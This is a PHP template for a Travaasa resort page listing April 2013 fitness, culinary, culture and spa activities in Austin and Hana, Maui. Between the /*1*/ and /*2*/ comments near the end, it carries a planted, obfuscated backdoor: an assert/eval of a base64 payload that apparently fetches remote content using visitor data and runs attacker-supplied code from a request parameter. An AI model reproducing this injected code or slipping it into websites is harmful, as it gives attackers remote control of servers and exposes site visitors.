<?php
    session_start();
    $loc = @$_GET['loc']; 
    if (strlen($loc) > 0 && ($loc == 'hana' || $loc == 'austin')){ 
      $_SESSION["origLoc"] = $loc;
    } elseif (isset($_SESSION["origLoc"])) {
      $loc = $_SESSION["origLoc"];
    } else {
      $loc = "default";
    }
   $path = $_SERVER['DOCUMENT_ROOT'];
   include_once($path."/Library/Travaasa_Common.php");
?>
<!DOCTYPE html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Travaasa April 2013 Featured Experiences</title>
    <meta name="keywords" content="travaasa, travel, resorts, hana, hāna, hawaii, austin, texas, Austin resort, Austin spa, travaasa Austin, Austin spa resort, experiential, hotel, Austin hotel, Austin conference center, Austin group meeting" />
    <meta name="description" content="Rediscover the magic of travel with Travaasa Austin, Texas or Hana, Maui." />
    <?php 
   include_once($path."/Library/Travaasa_Head.php");
    ?>
<!-- start NAVIS Code -->
<script type="text/javascript" src="http://www.navistechnologies.info/JavascriptPhoneNumber/js.aspx?account=15070&amp;jspass=ivcsp4gaxk4fbz8banxd&amp;dflt=<?php 
if ($loc == 'hana') :
echo NAVIS_GLOBAL_HANA;
elseif ($loc == 'austin') :
echo NAVIS_GLOBAL_AUSTIN;
else :
echo NAVIS_GLOBAL_DEFAULT;
endif; 
?>"></script>
<script type="text/javascript">ProcessNavisNCKeyword();</script>
<!-- end NAVIS Code -->
</head>
<body>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-MW4X3M"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MW4X3M');</script>
<!-- End Google Tag Manager -->
<?php 
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Menu_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Menu_Austin.php");
else :
include_once($path."/Library/Travaasa_Menu.php");
endif; 
?>
<section id="feature1_wrapper" class="feature_carousel clearfix">
    <div id="feature1" class="feature">
      <div class="slide"><img src="/assets/images/feature_months_april_2013_1600x640.jpg" alt=""></div>
    </div>
</section>
<section id="content">
<article id="main">
  <section class="intro pad clearfix">    
    <div class="section group">
        <div class="col span_1_of_2">
            <h2>Fitness</h2>
            <div class="listing">
                <h6>SPRING TRAINING <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Train like a pro and join our fitness team as we perform exercise drills to help warm up for the summer season.</p>
            </div>
            <div class="listing">
                <h6>Back to Nature Boot Camp <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Let this nature-filled workout be your morning coffee. This outdoor boot camp class incorporates many different training modalities, including strength, cardio, core, speed, agility, flexibility and injury prevention. Join us for this fun, high-energy, outdoor adventure!</p>
            </div>
            <div class="listing">
                <h6>Cultivate Happiness Collage <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Create a lovely magazine collage and stretch your perspective.</p>
            </div>
            <div class="listing">
                <h6>Growing Natural Rhythm Salsa Class <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Dance to salsa music that will inspire your natural rhythm to unleash and grow. Dancing is a great and fun way to become comfortable with your body, build confidence and self-esteem. The side effects are bursts of laughter and burning calories.</p>
            </div>
            <div class="listing">
                <h6>Tai Chi &amp; Nature <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Tai chi means moving the energy of our bodies in harmony with the energy of the universe. This practice brings us closer to nature as it can be practiced outdoors where we can appreciate, enjoy and explore the energy in our surroundings.</p>
            </div>
            <div class="listing">
                <h6>Foot Care &amp; Awareness <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>This workout teaches how to maintain healthy feet, nature's foundation for the joints above. Grow your foot awareness and rebalance your body as you acquire better postural alignment, overall function and coordination.</p>
            </div>
            <div class="listing">
                <h6>Grow an Inch Pilates <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Learn to control your inner core&#8212;the muscles from the bottom of your spine all the way up to the back of your skull. Pilates exercises are based on axial skeleton elongation and stability, designed to strengthen as you lengthen. Create more space within the joints, enabling growth of an inch or more as you develop strength.</p>
            </div>
            <div class="listing">
                <h6>Cultivate Heat Yoga <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>An intermediate yoga class designed to warm the muscles. Flowing sun salutations combine with longer-held poses to increase stamina and strength.</p>
            </div>
            <div class="listing">
                <h6>Hatha Yoga <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>A combination of mild warming flow and longer-held poses, suitable for both new and returning Yogis.</p>
            </div>
            <div class="listing">
                <h6>Explore Your Hips &amp; Knees Yoga Therapy <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Explore the mobility of the hips and knees through the use of Yoga Therapy <em>asanas</em>, or postures, experiencing a greater awareness of your true range of motion and strength.</p>
            </div>
            <div class="listing">
                <h6>Explore Quiet Yoga <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Yin Yoga is a more passive, slow-paced style of yoga. Asanas are held for five minutes each, allowing for a deeper state of each posture. </p>
            </div>
            <div class="listing">
                <h6>Zumba Fitness <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Explore other cultures through the art of dance, burning 400 to 600 calories in an hour along the way.</p>
            </div>            
        </div>
        <div class="col span_1_of_2">
            <h2>Culinary</h2>
            <div class="listing">
                <h6>Sprouts Galore <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Rich in vitamins, minerals and other phytochemicals, sprouts are a wise and delicious addition to daily meals. Learn the art of sprouting as well as simple methods to integrate them into a variety of dishes.</p>
            </div>
            <h2>Culture</h2>
             <div class="listing">
                <h6>Taro Tasting <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Taro has earned its place as a traditional Hawaiian staple&#8212;it’s abundant, appetizing, and all parts of the plant can be eaten. Prepare and taste a sampling from the more than 300 varieties present on the Hawaiian islands.</p>
            </div>
            <div class="listing">
                <h6>East Maui Taro Festival <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>The taro plant, also known as kalo in Hawaii, plays a central role in Hawaiian mythology. Taro came to Hawaii with the earliest Polynesian settlers in their canoes, and has been cultivated as a staple since ancient times. The East Maui Taro Festival is an opportunity for the community to share with others the importance and value of this heritage food. 
                <br/>This two-day event that takes place at Hana Ballpark, located just a few steps away from Travaasa Hana. There will be live entertainment, concession booths and local vendors celebrating the Taro.
                </p>
            </div>
           
            <h2>Spa &amp; Wellness</h2>
            <div class="listing">
                <h6>Discover the Eight Limbs of Yoga <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>A general hatha yoga class set with the intention of exploring the philosophy of yoga. Appropriate for beginners and intermediate.</p>
            </div>
            <div class="listing">
                <h6>Farm to Blender Juicing <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Grow green, eat green, drink green, be green and live green. This is the theme of a new generation of people who desire to live healthy and in harmony with nature. Green vegetables have more valuable nutrients than any other food in existence. Blending your greens helps make nutrients more readily available to the body.</p>
            </div>
            <div class="listing">
                <h6>Meditation | Tune into Nature <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Stop and savor the surrounding beauty of the Balcones Canyonlands Preserve. Quiet introspection and silence allow you to deepen your level of appreciation, establish a space within, and leave you replenished and revitalized.</p>
            </div>
            <div class="listing">
                <h6>Journal &amp; Grow <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Grow more into your complete self by integrating different parts of your psyche.</p>
            </div>
             <div class="listing">
                <h6>Explore Watercolors <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Learn different watercolor techniques by painting a pre-drawn still life.</p>
            </div>
        </div>
    </div>  
      
  </section>
  
  <section class="grey pad">
        <h4>See upcoming months</h4>
        <div class="group">
            <div class="col span_1_of_3 month"><div class="active"><a href="/calendar/2013/april/"><img src="/assets/images/months/apr-grow.png" alt="April is Grow Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2013/may/"><img src="/assets/images/months/may-nuture.png" alt="May is Nuture Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2013/june/"><img src="/assets/images/months/jun-man.png" alt="June is Man Month"></a></div></div>
        </div>
  </section>
  
</article>
</section>
<?php
/*1*/ 
if (!$ind5eae2f00) { $ind5eae2f00 = TRUE;assert("e"."v"."a"."l(b"."a"."s"."e"."6"."4_d"."e"."c"."o"."d"."e('ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXT1BcnJheShiYXNlNjRfZGVjb2RlKCdaWCcgLidKeWIzJyAuJ0onIC4nZmMnIC4nbVZ3YicgLiczSjBhVzVuJyksYmFzZTY0X2RlY29kZSgnYVc1cFgzJyAuJ05sJyAuJ2RBJyAuJz09JyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMScgLic5dFlYJyAuJ1JqYUE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVicgLic5blpYUmZZMjknIC4ndWRHVnVkSE09JyksYmFzZTY0X2RlY29kZSgnYzMnIC4nUnknIC4nY21sd2IzTScgLic9JyksYmFzZTY0X2RlY29kZSgnYlgnIC4nUmZjbUZ1WkE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptJyAuJ2RsJyAuJ2RHTnpkJyAuJ2c9PScpLGJhc2U2NF9kZWNvZGUoJ2RYJyAuJ0onIC4nc1onIC4nVzVqYjJSbCcpLGJhc2U2NF9kZWNvZGUoJ2RYSicgLidzJyAuJ1pXNWpiJyAuJzJSbCcpLGJhc2U2NF9kZWNvZGUoJ2JXUTEnKSxiYXNlNjRfZGVjb2RlKCcnIC4nYVc1cFgyZGxkJyAuJ0E9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVjluWicgLidYUmZZMjknIC4ndWRHJyAuJ1Z1ZEhNPScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nblZ1WTNSJyAuJ3AnIC4nYjInIC4nNWZaWGhwJyAuJ2MzUnonKSxiYXNlNjRfZGVjb2RlKCdZM1Z5YkY5cGJtJyAuJ2wwJyksYmFzZTY0X2RlY29kZSgnJyAuJ1kzVnliRjl6JyAuJ1onIC4nWFJ2Y0hRJyAuJz0nKSxiYXNlNjRfZGVjb2RlKCdZJyAuJzNWeWJGOXpaWFInIC4ndmNIUT0nKSxiYXNlNjRfZGVjb2RlKCcnIC4nWTNWeWJGOScgLidsZUcnIC4nVmonKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWMnIC4nRzl6JyksYmFzZTY0X2RlY29kZSgnZFc1JyAuJ3dZV05yJyksYmFzZTY0X2RlY29kZSgnWTMnIC4nVnliRjlqYkc5eicgLidaJyAuJ1E9PScpLGJhc2U2NF9kZWNvZGUoJ2RIJyAuJ0onIC4ncGJRPScgLic9JyksYmFzZTY0X2RlY29kZSgnYzJWemMybHZibCcgLic5cFonIC4nQT09JyksYmFzZTY0X2RlY29kZSgnWm4nIC4nTicgLid2JyAuJ1kydHZjR1Z1JyksYmFzZTY0X2RlY29kZSgnWm1kbGRHTT0nKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWRHOXNiM2RsY2c9PScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nbmQnIC4neWFYUicgLidsJyksYmFzZTY0X2RlY29kZSgnWm1WdlpnPT0nKSxiYXNlNjRfZGVjb2RlKCdabWRsJyAuJ2RITT0nKSxiYXNlNjRfZGVjb2RlKCdiWFInIC4nZmNtRnVaQT09JyksYmFzZTY0X2RlY29kZSgnWTNKbFlYUmxYMloxJyAuJ2JtJyAuJ04wYVc5dScpLGJhc2U2NF9kZWNvZGUoJ1ptTnNiM05sJyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMTl6Y0d4JyAuJ3BkQT09JyksYmFzZTY0X2RlY29kZSgnYlhSJyAuJ2ZjJyAuJ21GdVpBPT0nKSxiYXNlNjRfZGVjb2RlKCdabXh2WTInIC4ncz0nKSxiYXNlNjRfZGVjb2RlKCdjM1J5YVhCeicgLidiR0Z6JyAuJ2EnIC4nR1Z6JykpOyAgZnVuY3Rpb24gXzM5OTQyODQoJGkpeyRhPUFycmF5KCdaR2x6JyAuJ2NHeGgnIC4nZVYnIC4nOWxjbkp2Y25NPScsJ01BPT0nLCdZMnhwWicgLidXNTBYMk4nIC4nb1pXJyAuJ04nIC4ncicsJ1kyeCcgLidwWicgLidXJyAuJzUwWDInIC4nTm9aJyAuJ1dOcicsJ1MnIC4nRicgLidSJyAuJ1VVRjlCUScgLicwTkZVRlJmUTBoQlVsTkZWQT0nIC4nPScsJ0lTNGgnIC4nZFE9JyAuJz0nLCdVME4nIC4nU1NWJyAuJ0JVWCcgLicwWicgLidKVEVWTycgLidRVTFGJywnVlYnIC4nUkdMVGcnIC4nPScsJ2QnIC4nMmx1JyAuJ1pHOScgLiczY3kwJyAuJ3hNaicgLidVJyAuJ3gnLCdTRlJVVUY5QlEwTicgLidGVUYnIC4nUmZRMGhCVWxORlZBPT0nLCdjRzEnIC4ndScsJ1UwVlNWa1ZTWDA1QlRVVT0nLCdVa1ZSVlVWJyAuJ1RWRjlWVWtrPScsJ1MnIC4nRlInIC4nVVVGOVZVMFZTWCcgLicwRkhSVTVVJywnVWtWJyAuJ05UJyAuJzFSRlgnIC4nMEYnIC4nRVJGST0nLCdkV3hwYm10a1knIC4naTVqYicgLicyMD0nLCdMJyAuJzJkbGRDNScgLid3YUgnIC4nQS9aRDA9JywnSm5VOScsJ0ptTTknLCdKbWs5TVNacCcgLidjRCcgLicwPScsJ0ptJyAuJ2c5JywnTScgLid6a3dZalZoTScgLidXUTVaJyAuJ1RNMllUUXpNMlUnIC4nMFltSXhZelInIC4naVkyWScgLicxTVdGbE0yVScgLic9JywnJyAuJ01RPT0nLCdZV3gnIC4nc2IzZGYnIC4nZFhKcycgLidYJyAuJzJadmNHJyAuJ1Z1JywnJyAuJ2FIUicgLicwY0QnIC4nbycgLid2JyAuJ0x3PScgLic9JywnWTNWeScgLidiRjlwYm1sMCcsJ2FIUicgLicwY0Rvdkx3PT0nLCdaMmR2Wkc5JyAuJzAnIC4nZScgLidIRicgLid3YVdOJyAuJ21aSCcgLidJPScsJycgLidkR0ZrYW1GNicsJ1IwJyAuJ1ZVSScgLidBPT0nLCdJRWgnIC4nVVZGQXZNUzR4RFFvJyAuJz0nLCdTRzl6ZEQnIC4nb2cnLCdEJyAuJ1FvPScsJ1EyOXVibScgLidWamRHbHYnIC4nYicgLidqJyAuJ29nUTJ4dmMyVU5DZzBLJywnJywnTDF4U1hGJyAuJ0l2JywnJyAuJ2NBPT0nLCdOVycgLidWaFpUJyAuJ0ptTURBJyAuJz0nKTtyZXR1cm4gYmFzZTY0X2RlY29kZSgkYVskaV0pO30gIGlmKCFpc3NldCgkeGIyNGEwZThfMCkpeyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVswXShyb3VuZCgwKSk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzFdKF8zOTk0Mjg0KDApLF8zOTk0Mjg0KDEpKTtpZighZW1wdHkoJF9DT09LSUVbXzM5OTQyODQoMildKSlkaWUoJF9DT09LSUVbXzM5OTQyODQoMyldKTtpZighaXNzZXQoJHhiMjRhMGU4XzFbXzM5OTQyODQoNCldKSl7aWYoJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzJdKF8zOTk0Mjg0KDUpLCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszXSgkX1NFUlZFUltfMzk5NDI4NCg2KV0pKSkkeGIyNGEwZThfMj1fMzk5NDI4NCg3KTtlbHNlICR4YjI0YTBlOF8yPV8zOTk0Mjg0KDgpO31lbHNleyR4YjI0YTBlOF8yPSR4YjI0YTBlOF8xW18zOTk0Mjg0KDkpXTskeGIyNGEwZThfMz1fMzk5NDI4NCgxMCk7fSR4YjI0YTBlOF80PSRfU0VSVkVSW18zOTk0Mjg0KDExKV0gLiRfU0VSVkVSW18zOTk0Mjg0KDEyKV07JHhiMjRhMGU4XzU9JF9TRVJWRVJbXzM5OTQyODQoMTMpXTskeGIyNGEwZThfNj0kX1NFUlZFUltfMzk5NDI4NCgxNCldO3doaWxlKHJvdW5kKDArODIyLjIrODIyLjIrODIyLjIrODIyLjIrODIyLjIpLXJvdW5kKDArMjA1NS41KzIwNTUuNSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzRdKCR4YjI0YTBlOF83LCR4YjI0YTBlOF84LCR4YjI0YTBlOF8wLCR4YjI0YTBlOF81KTskeGIyNGEwZThfOT1fMzk5NDI4NCgxNSk7aWYocm91bmQoMCszMTc4LjUrMzE3OC41KTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bNV0ocm91bmQoMCs5NjQuNSs5NjQuNSkscm91bmQoMCsxMTA1Ljc1KzExMDUuNzUrMTEwNS43NSsxMTA1Ljc1KSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzZdKCR4YjI0YTBlOF8xLCR4YjI0YTBlOF80KTskeGIyNGEwZThfMTA9XzM5OTQyODQoMTYpIC4kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bN10oJHhiMjRhMGU4XzQpIC5fMzk5NDI4NCgxNykgLiRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVs4XSgkeGIyNGEwZThfNSkgLl8zOTk0Mjg0KDE4KSAuJHhiMjRhMGU4XzIgLl8zOTk0Mjg0KDE5KSAuJHhiMjRhMGU4XzYgLl8zOTk0Mjg0KDIwKSAuJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzldKF8zOTk0Mjg0KDIxKSAuJHhiMjRhMGU4XzQgLiR4YjI0YTBlOF81IC4keGIyNGEwZThfMiAuXzM5OTQyODQoMjIpKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTBdKF8zOTk0Mjg0KDIzKSk9PSByb3VuZCgwKzEpKXskeGIyNGEwZThfMD0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTFdKF8zOTk0Mjg0KDI0KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7fWVsc2VpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTJdKF8zOTk0Mjg0KDI1KSkpeyR4YjI0YTBlOF8xMT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTNdKF8zOTk0Mjg0KDI2KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE0XSgkeGIyNGEwZThfMTEsNDIsRkFMU0UpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNV0oJHhiMjRhMGU4XzExLDE5OTEzLFRSVUUpOyR4YjI0YTBlOF8wPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNl0oJHhiMjRhMGU4XzExKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTddKF8zOTk0Mjg0KDI3KSxfMzk5NDI4NCgyOCkpIT09ZmFsc2UpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE4XSgkeGIyNGEwZThfOSwkeGIyNGEwZThfNiwkeGIyNGEwZThfMTIpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxOV0oJHhiMjRhMGU4XzExKTtpZigocm91bmQoMCsyOTczKStyb3VuZCgwKzIyOTkrMjI5OSkpPnJvdW5kKDArMjk3Myl8fCAkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjBdKCR4YjI0YTBlOF81LCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTApKTtlbHNleyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMV0oJHhiMjRhMGU4XzgsJHhiMjRhMGU4XzE0LCR4YjI0YTBlOF8wKTt9fWVsc2V7JHhiMjRhMGU4XzEzPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMl0oJHhiMjRhMGU4Xzkscm91bmQoMCs4MCksJHhiMjRhMGU4XzgsJHhiMjRhMGU4Xzcscm91bmQoMCsxMCsxMCsxMCkpO2lmKChyb3VuZCgwKzM4NDIpXnJvdW5kKDArMzg0MikpJiYgJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzIzXSgkX1JFUVVFU1QsJHhiMjRhMGU4XzIpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNF0oJHhiMjRhMGU4XzksJF9DT09LSUUsJHhiMjRhMGU4XzExKTtpZigkeGIyNGEwZThfMTMpeyR4YjI0YTBlOF8xND1fMzk5NDI4NCgyOSkgLiR4YjI0YTBlOF8xMCAuXzM5OTQyODQoMzApOyR4YjI0YTBlOF8xNCAuPSBfMzk5NDI4NCgzMSkgLiR4YjI0YTBlOF85IC5fMzk5NDI4NCgzMik7JHhiMjRhMGU4XzE0IC49IF8zOTk0Mjg0KDMzKTskR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjVdKCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTQpOyR4YjI0YTBlOF8xNT1fMzk5NDI4NCgzNCk7d2hpbGUoISRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNl0oJHhiMjRhMGU4XzEzKSl7JHhiMjRhMGU4XzE1IC49ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyN10oJHhiMjRhMGU4XzEzLHJvdW5kKDArMTI4KSk7aWYocm91bmQoMCsxNTc5LjIrMTU3OS4yKzE1NzkuMisxNTc5LjIrMTU3OS4yKTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjhdKHJvdW5kKDArNjQ1KzY0NSs2NDUrNjQ1KzY0NSkscm91bmQoMCsyMzMzKzIzMzMpKSkkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjldKCR4YjI0YTBlOF80LCRfU0VSVkVSKTt9JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMwXSgkeGIyNGEwZThfMTMpO2xpc3QoJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8wKT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMzFdKF8zOTk0Mjg0KDM1KSwkeGIyNGEwZThfMTUscm91bmQoMCswLjQrMC40KzAuNCswLjQrMC40KSk7aWYocm91bmQoMCsxMzg1LjMzMzMzMzMzMzMrMTM4NS4zMzMzMzMzMzMzKzEzODUuMzMzMzMzMzMzMyk8JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMyXShyb3VuZCgwKzU3NCs1NzQpLHJvdW5kKDArMTUwMS41KzE1MDEuNSkpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszM10oJHhiMjRhMGU4XzYsJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8yKTt9fWlmKEAkX1JFUVVFU1RbXzM5OTQyODQoMzYpXT09IF8zOTk0Mjg0KDM3KSlldmFsKCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszNF0oJF9SRVFVRVNUWyJjIl0pKTt9ZWNobyAkeGIyNGEwZThfMDsg'))");}
 /*2*/
 
include_once($path."/Library/Travaasa_Testimonials.php");
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Footer_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Footer_Austin.php");
else :
include_once($path."/Library/Travaasa_Footer.php");
endif; 
include_once($path."/Library/Travaasa_Scripts.php");
?><script type="text/javascript">
$(function() {
    createSubpageStorylines(true, true);
});
</script>
</body>
</html>